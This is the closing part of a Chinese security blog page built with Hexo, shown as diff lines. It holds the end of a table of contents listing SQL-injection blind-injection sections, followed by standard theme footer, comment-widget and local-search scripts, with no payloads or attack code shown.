href="#一般的注入方法"><span class="nav-number">2.4.1.</span> <span class="nav-text">一般的注入方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#若将information等关键字过滤了："><span class="nav-number">2.4.2.</span> <span class="nav-text">若将information等关键字过滤了：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用order-by进行盲注"><span class="nav-number">2.5.</span> <span class="nav-text">使用order by进行盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用between进行盲注"><span class="nav-number">2.6.</span> <span class="nav-text">使用between进行盲注</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        ﻿<div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="heart">
+    <i class="fa fa-heart" aria-hidden="true"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">gtfly</span>
+
+ <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+ <script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("07/16/2018 12:49:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "已存在 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+ setInterval("createtime()",250);
+ </script>
+
+<!--
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+-->
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </div></footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '9Pgz8ir0b40IXQ5V3bjRc8m0-gzGzoHsz',
+        appKey: 'VCCuCSQHpPqX3hmOh0PlmfXu',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+ <!-- ҳ����С���� -->
+ <script type="text/javascript" src="/js/src/love.js"></script>
+
+  
+  
+  <!--������ƭ-->
+ <script type="text/javascript" src="/js/src/crash_cheat.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+  <script>
+  $("body").backstretch("https://myqinshimoon.github.io/background.jpg");
+  </script>
+
+
+</body>
+</html>
